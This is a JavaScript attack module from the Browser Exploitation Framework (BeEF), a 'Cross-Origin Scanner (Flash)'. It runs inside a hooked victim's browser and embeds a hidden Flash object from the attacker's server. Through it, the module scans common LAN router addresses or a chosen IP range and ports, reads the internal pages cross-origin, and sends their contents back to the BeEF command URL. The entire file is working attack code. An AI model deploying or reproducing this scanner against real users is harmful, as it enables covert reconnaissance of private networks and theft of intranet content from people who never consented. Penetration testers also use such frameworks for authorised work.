//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var ipRange = "<%= @ipRange %>";
  var ports   = "<%= @ports %>";
  var threads = "<%= @threads %>";
  var timeout = <%= @timeout %>*1000;
  var wait = 2;

  if(!beef.browser.hasFlash()) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.are.status_error());
    return;
  }

  // set target ports
  if (ports != null) {
    ports = ports.split(',');
  }

  // set target IP addresses
  if (ipRange == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
      return;
    }
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // the fourth octet will be iterated.
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (var i = lowerBound; i <= upperBound; i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Cross-Origin Scanner (Flash)] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) {
        timer = setInterval(this.process, frequency);
      }
    }

  }

  var init = function(id, port) {
    var newObjectTag;
    var attr = {}, param = {};
    var url = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/objects/ContentHijacking.swf';
    attr = {id: 'cross_origin_flash_<%= @command_id %>_'+id+'_'+port, width: 1, height: 1, 'style': 'visibility: hidden', 'type': 'application/x-shockwave-flash', 'AllowScriptAccess': 'always'};
    param = {'AllowScriptAccess': 'always'};
    attr.data = url;
    newObjectTag = createHTMLObject(attr,param);
    beef.debug("[Cross-Origin Scanner (Flash)] Waiting for the new object...");
    document.body.appendChild(newObjectTag);
  };

  // create and embed Flash object
  var createHTMLObject = function(attributes, parameters) {
    var i, html, div, obj, attr = attributes || {}, param = parameters || {};
    html = '<object';
    for (i in attr) html += ' ' + i + '="' + attr[i] + '"';
    html += '>';
    for (i in param) html += '<param name="' + i + '" value="' + param[i] + '" />';
    html += '</object>';
    div = document.createElement('div');
    div.innerHTML = html;
    obj = div.firstChild;
    div.removeChild(obj);
    return obj;
  };

  // fetch a URL with Flash
  var get_url = function(proto, host, port, id) {
    var objCaller;
    var url = 'http://'+host+':'+port+'/';
    beef.debug("[Cross-Origin Scanner (Flash)] Fetching URL: " + url);
    objCaller = document.getElementById('cross_origin_flash_<%= @command_id %>_'+id+'_'+port);
    try {
      objCaller.GETURL('function(data) { '+
        'var proto = "http";' +
        'var host = "'+host+'";' +
        'var port = "'+port+'";' +
        'var data = unescape(data);' +
        'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +
        'if (!data.match("Hijacked Contents:")) return;' +
        'var response = data.replace(/^Hijacked Contents:\\r\\n/);' +
        'var title = "";' +
        'if (response.match("<title>(.*?)<\\/title>")) {' +
        '  title = response.match("<title>(.*?)<\\/title>")[1];' +
        '}' +
        'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
      ' }', url);
    } catch(e) {
      beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
    }
    setTimeout('document.body.removeChild(document.getElementById("cross_origin_flash_<%= @command_id %>_'+id+'_'+port+'"));', timeout);
  }

  beef.debug("[Cross-Origin Scanner (Flash)] Starting scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");

  // create worker queue
  var workers = new Array();
  for (w=0; w < threads; w++) {
    workers.push(new WorkerQueue(wait*1000));
  }

  // send Flash request to each IP
  var proto = 'http';
  for (var i=0; i < ips.length; i++) {
    var worker = workers[i % threads];
    for (var p=0; p < ports.length; p++) {
      var host = ips[i];
      var port = ports[p];
      worker.queue("init("+i+", "+port+"); setTimeout(function() {get_url('"+proto+"', '"+host+"', '"+port+"', "+i+");}, 2000)");
    }
  }

});

